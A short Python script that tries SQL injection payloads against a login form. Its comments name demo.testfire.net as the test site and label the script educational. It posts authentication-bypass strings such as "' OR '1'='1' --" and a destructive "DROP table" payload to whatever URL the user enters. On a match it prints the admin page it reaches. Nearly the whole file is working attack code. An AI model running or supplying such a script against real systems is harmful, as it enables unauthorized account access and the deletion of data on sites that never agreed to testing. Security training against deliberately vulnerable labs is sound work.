import requests

#uses TEST site
#target: https://demo.testfire.net/index.jsp
#education purposes only

#CHECK FOR VULNERABILITIES WITH PAYLOAD INJECTIONS IN INPUTS
def test_sql_injection_login(url, payloads):
    with requests.Session() as session:
        for payload in payloads:
            data_user = {
                'uid': payload,
                'passw': 'admin'  # a benign password for testing
            }

            response_user = session.post(url, data=data_user, allow_redirects=True)

            print('\nPOST login (uid inj) -->', response_user.status_code)

            if response_user.status_code in (200, 302, 303):
                print("Request was successful, checking for redirects.")
                print("Final URL after redirect:", response_user.url)

                if 'Welcome' in response_user.text or 'Admin' in response_user.text or 'Hello' in response_user.text:
                    print("Successfully logged in and redirected to admin page!")
                    print(f'Successful payload -->\t{payload}')
                    admin_url = response_user.url

                    admin_response = session.get(admin_url)
                    print('-'*30)
                    print('Accessing Admin Page --->\t', admin_response.status_code)
                    print('Admin Page Content: ', admin_response.text)
                    exit(1)
                else:
                    print("Not redirected to admin page.")
            else:
                print(f"Request failed with status code: {response_user.status_code}")

if __name__ == "__main__":
    payloads = ["'; DROP table; --","' OR '1'='1' --", "--", "'1'='1'"] #sample payloads

    url = input('Enter the target URL (e.g., http://example.com/form?): ')
    #to target correctly you should look at the action form
    #example
    #on https://demo.testfire.net/login.jsp search for the name of the action form near inputs
    #after inspecting the html we find <form action="doLogin" method="post" name="login" id="login" onsubmit="return (confirminput(login));">
    #the target is 'doLogin'
    #the link would be https://demo.testfire.net/doLogin?
    test_sql_injection_login(url, payloads)